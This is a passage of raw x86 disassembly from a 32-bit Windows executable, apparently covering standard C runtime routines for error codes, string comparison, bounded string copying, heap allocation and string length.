  4042ad:	e8 5a 23 00 00       	call   0x40660c
  4042b2:	85 c0                	test   %eax,%eax
  4042b4:	75 06                	jne    0x4042bc
  4042b6:	b8 28 f2 40 00       	mov    $0x40f228,%eax
  4042bb:	c3                   	ret
  4042bc:	83 c0 08             	add    $0x8,%eax
  4042bf:	c3                   	ret
  4042c0:	e8 47 23 00 00       	call   0x40660c
  4042c5:	85 c0                	test   %eax,%eax
  4042c7:	75 06                	jne    0x4042cf
  4042c9:	b8 2c f2 40 00       	mov    $0x40f22c,%eax
  4042ce:	c3                   	ret
  4042cf:	83 c0 0c             	add    $0xc,%eax
  4042d2:	c3                   	ret
  4042d3:	8b ff                	mov    %edi,%edi
  4042d5:	55                   	push   %ebp
  4042d6:	8b ec                	mov    %esp,%ebp
  4042d8:	56                   	push   %esi
  4042d9:	e8 e2 ff ff ff       	call   0x4042c0
  4042de:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4042e1:	51                   	push   %ecx
  4042e2:	89 08                	mov    %ecx,(%eax)
  4042e4:	e8 82 ff ff ff       	call   0x40426b
  4042e9:	59                   	pop    %ecx
  4042ea:	8b f0                	mov    %eax,%esi
  4042ec:	e8 bc ff ff ff       	call   0x4042ad
  4042f1:	89 30                	mov    %esi,(%eax)
  4042f3:	5e                   	pop    %esi
  4042f4:	5d                   	pop    %ebp
  4042f5:	c3                   	ret
  4042f6:	6a 0c                	push   $0xc
  4042f8:	68 28 d8 40 00       	push   $0x40d828
  4042fd:	e8 ce 07 00 00       	call   0x404ad0
  404302:	6a 0e                	push   $0xe
  404304:	e8 e2 29 00 00       	call   0x406ceb
  404309:	59                   	pop    %ecx
  40430a:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40430e:	8b 75 08             	mov    0x8(%ebp),%esi
  404311:	8b 4e 04             	mov    0x4(%esi),%ecx
  404314:	85 c9                	test   %ecx,%ecx
  404316:	74 2f                	je     0x404347
  404318:	a1 6c 0b 41 00       	mov    0x410b6c,%eax
  40431d:	ba 68 0b 41 00       	mov    $0x410b68,%edx
  404322:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  404325:	85 c0                	test   %eax,%eax
  404327:	74 11                	je     0x40433a
  404329:	39 08                	cmp    %ecx,(%eax)
  40432b:	75 2c                	jne    0x404359
  40432d:	8b 48 04             	mov    0x4(%eax),%ecx
  404330:	89 4a 04             	mov    %ecx,0x4(%edx)
  404333:	50                   	push   %eax
  404334:	e8 72 f8 ff ff       	call   0x403bab
  404339:	59                   	pop    %ecx
  40433a:	ff 76 04             	push   0x4(%esi)
  40433d:	e8 69 f8 ff ff       	call   0x403bab
  404342:	59                   	pop    %ecx
  404343:	83 66 04 00          	andl   $0x0,0x4(%esi)
  404347:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40434e:	e8 0a 00 00 00       	call   0x40435d
  404353:	e8 bd 07 00 00       	call   0x404b15
  404358:	c3                   	ret
  404359:	8b d0                	mov    %eax,%edx
  40435b:	eb c5                	jmp    0x404322
  40435d:	6a 0e                	push   $0xe
  40435f:	e8 ae 28 00 00       	call   0x406c12
  404364:	59                   	pop    %ecx
  404365:	c3                   	ret
  404366:	cc                   	int3
  404367:	cc                   	int3
  404368:	cc                   	int3
  404369:	cc                   	int3
  40436a:	cc                   	int3
  40436b:	cc                   	int3
  40436c:	cc                   	int3
  40436d:	cc                   	int3
  40436e:	cc                   	int3
  40436f:	cc                   	int3
  404370:	8b 54 24 04          	mov    0x4(%esp),%edx
  404374:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  404378:	f7 c2 03 00 00 00    	test   $0x3,%edx
  40437e:	75 3c                	jne    0x4043bc
  404380:	8b 02                	mov    (%edx),%eax
  404382:	3a 01                	cmp    (%ecx),%al
  404384:	75 2e                	jne    0x4043b4
  404386:	0a c0                	or     %al,%al
  404388:	74 26                	je     0x4043b0
  40438a:	3a 61 01             	cmp    0x1(%ecx),%ah
  40438d:	75 25                	jne    0x4043b4
  40438f:	0a e4                	or     %ah,%ah
  404391:	74 1d                	je     0x4043b0
  404393:	c1 e8 10             	shr    $0x10,%eax
  404396:	3a 41 02             	cmp    0x2(%ecx),%al
  404399:	75 19                	jne    0x4043b4
  40439b:	0a c0                	or     %al,%al
  40439d:	74 11                	je     0x4043b0
  40439f:	3a 61 03             	cmp    0x3(%ecx),%ah
  4043a2:	75 10                	jne    0x4043b4
  4043a4:	83 c1 04             	add    $0x4,%ecx
  4043a7:	83 c2 04             	add    $0x4,%edx
  4043aa:	0a e4                	or     %ah,%ah
  4043ac:	75 d2                	jne    0x404380
  4043ae:	8b ff                	mov    %edi,%edi
  4043b0:	33 c0                	xor    %eax,%eax
  4043b2:	c3                   	ret
  4043b3:	90                   	nop
  4043b4:	1b c0                	sbb    %eax,%eax
  4043b6:	d1 e0                	shl    $1,%eax
  4043b8:	83 c0 01             	add    $0x1,%eax
  4043bb:	c3                   	ret
  4043bc:	f7 c2 01 00 00 00    	test   $0x1,%edx
  4043c2:	74 18                	je     0x4043dc
  4043c4:	8a 02                	mov    (%edx),%al
  4043c6:	83 c2 01             	add    $0x1,%edx
  4043c9:	3a 01                	cmp    (%ecx),%al
  4043cb:	75 e7                	jne    0x4043b4
  4043cd:	83 c1 01             	add    $0x1,%ecx
  4043d0:	0a c0                	or     %al,%al
  4043d2:	74 dc                	je     0x4043b0
  4043d4:	f7 c2 02 00 00 00    	test   $0x2,%edx
  4043da:	74 a4                	je     0x404380
  4043dc:	66 8b 02             	mov    (%edx),%ax
  4043df:	83 c2 02             	add    $0x2,%edx
  4043e2:	3a 01                	cmp    (%ecx),%al
  4043e4:	75 ce                	jne    0x4043b4
  4043e6:	0a c0                	or     %al,%al
  4043e8:	74 c6                	je     0x4043b0
  4043ea:	3a 61 01             	cmp    0x1(%ecx),%ah
  4043ed:	75 c5                	jne    0x4043b4
  4043ef:	0a e4                	or     %ah,%ah
  4043f1:	74 bd                	je     0x4043b0
  4043f3:	83 c1 02             	add    $0x2,%ecx
  4043f6:	eb 88                	jmp    0x404380
  4043f8:	8b ff                	mov    %edi,%edi
  4043fa:	55                   	push   %ebp
  4043fb:	8b ec                	mov    %esp,%ebp
  4043fd:	8b 55 08             	mov    0x8(%ebp),%edx
  404400:	56                   	push   %esi
  404401:	57                   	push   %edi
  404402:	85 d2                	test   %edx,%edx
  404404:	74 07                	je     0x40440d
  404406:	8b 7d 0c             	mov    0xc(%ebp),%edi
  404409:	85 ff                	test   %edi,%edi
  40440b:	75 13                	jne    0x404420
  40440d:	e8 9b fe ff ff       	call   0x4042ad
  404412:	6a 16                	push   $0x16
  404414:	5e                   	pop    %esi
  404415:	89 30                	mov    %esi,(%eax)
  404417:	e8 3f fe ff ff       	call   0x40425b
  40441c:	8b c6                	mov    %esi,%eax
  40441e:	eb 33                	jmp    0x404453
  404420:	8b 45 10             	mov    0x10(%ebp),%eax
  404423:	85 c0                	test   %eax,%eax
  404425:	75 04                	jne    0x40442b
  404427:	88 02                	mov    %al,(%edx)
  404429:	eb e2                	jmp    0x40440d
  40442b:	8b f2                	mov    %edx,%esi
  40442d:	2b f0                	sub    %eax,%esi
  40442f:	8a 08                	mov    (%eax),%cl
  404431:	88 0c 06             	mov    %cl,(%esi,%eax,1)
  404434:	40                   	inc    %eax
  404435:	84 c9                	test   %cl,%cl
  404437:	74 03                	je     0x40443c
  404439:	4f                   	dec    %edi
  40443a:	75 f3                	jne    0x40442f
  40443c:	85 ff                	test   %edi,%edi
  40443e:	75 11                	jne    0x404451
  404440:	c6 02 00             	movb   $0x0,(%edx)
  404443:	e8 65 fe ff ff       	call   0x4042ad
  404448:	6a 22                	push   $0x22
  40444a:	59                   	pop    %ecx
  40444b:	89 08                	mov    %ecx,(%eax)
  40444d:	8b f1                	mov    %ecx,%esi
  40444f:	eb c6                	jmp    0x404417
  404451:	33 c0                	xor    %eax,%eax
  404453:	5f                   	pop    %edi
  404454:	5e                   	pop    %esi
  404455:	5d                   	pop    %ebp
  404456:	c3                   	ret
  404457:	8b ff                	mov    %edi,%edi
  404459:	55                   	push   %ebp
  40445a:	8b ec                	mov    %esp,%ebp
  40445c:	53                   	push   %ebx
  40445d:	8b 5d 08             	mov    0x8(%ebp),%ebx
  404460:	83 fb e0             	cmp    $0xffffffe0,%ebx
  404463:	77 6f                	ja     0x4044d4
  404465:	56                   	push   %esi
  404466:	57                   	push   %edi
  404467:	83 3d f4 13 41 00 00 	cmpl   $0x0,0x4113f4
  40446e:	75 18                	jne    0x404488
  404470:	e8 14 19 00 00       	call   0x405d89
  404475:	6a 1e                	push   $0x1e
  404477:	e8 5e 17 00 00       	call   0x405bda
  40447c:	68 ff 00 00 00       	push   $0xff
  404481:	e8 7c 03 00 00       	call   0x404802
  404486:	59                   	pop    %ecx
  404487:	59                   	pop    %ecx
  404488:	85 db                	test   %ebx,%ebx
  40448a:	74 04                	je     0x404490
  40448c:	8b c3                	mov    %ebx,%eax
  40448e:	eb 03                	jmp    0x404493
  404490:	33 c0                	xor    %eax,%eax
  404492:	40                   	inc    %eax
  404493:	50                   	push   %eax
  404494:	6a 00                	push   $0x0
  404496:	ff 35 f4 13 41 00    	push   0x4113f4
  40449c:	ff 15 9c b0 40 00    	call   *0x40b09c
  4044a2:	8b f8                	mov    %eax,%edi
  4044a4:	85 ff                	test   %edi,%edi
  4044a6:	75 26                	jne    0x4044ce
  4044a8:	6a 0c                	push   $0xc
  4044aa:	5e                   	pop    %esi
  4044ab:	39 05 84 15 41 00    	cmp    %eax,0x411584
  4044b1:	74 0d                	je     0x4044c0
  4044b3:	53                   	push   %ebx
  4044b4:	e8 e4 01 00 00       	call   0x40469d
  4044b9:	59                   	pop    %ecx
  4044ba:	85 c0                	test   %eax,%eax
  4044bc:	75 a9                	jne    0x404467
  4044be:	eb 07                	jmp    0x4044c7
  4044c0:	e8 e8 fd ff ff       	call   0x4042ad
  4044c5:	89 30                	mov    %esi,(%eax)
  4044c7:	e8 e1 fd ff ff       	call   0x4042ad
  4044cc:	89 30                	mov    %esi,(%eax)
  4044ce:	8b c7                	mov    %edi,%eax
  4044d0:	5f                   	pop    %edi
  4044d1:	5e                   	pop    %esi
  4044d2:	eb 14                	jmp    0x4044e8
  4044d4:	53                   	push   %ebx
  4044d5:	e8 c3 01 00 00       	call   0x40469d
  4044da:	59                   	pop    %ecx
  4044db:	e8 cd fd ff ff       	call   0x4042ad
  4044e0:	c7 00 0c 00 00 00    	movl   $0xc,(%eax)
  4044e6:	33 c0                	xor    %eax,%eax
  4044e8:	5b                   	pop    %ebx
  4044e9:	5d                   	pop    %ebp
  4044ea:	c3                   	ret
  4044eb:	cc                   	int3
  4044ec:	cc                   	int3
  4044ed:	cc                   	int3
  4044ee:	cc                   	int3
  4044ef:	cc                   	int3
  4044f0:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4044f4:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  4044fa:	74 24                	je     0x404520
  4044fc:	8a 01                	mov    (%ecx),%al
  4044fe:	83 c1 01             	add    $0x1,%ecx
  404501:	84 c0                	test   %al,%al
  404503:	74 4e                	je     0x404553
  404505:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  40450b:	75 ef                	jne    0x4044fc
  40450d:	05 00 00 00 00       	add    $0x0,%eax
  404512:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  404519:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  404520:	8b 01                	mov    (%ecx),%eax
  404522:	ba ff fe fe 7e       	mov    $0x7efefeff,%edx
  404527:	03 d0                	add    %eax,%edx
  404529:	83 f0 ff             	xor    $0xffffffff,%eax
  40452c:	33 c2                	xor    %edx,%eax
  40452e:	83 c1 04             	add    $0x4,%ecx
  404531:	a9 00 01 01 81       	test   $0x81010100,%eax
  404536:	74 e8                	je     0x404520
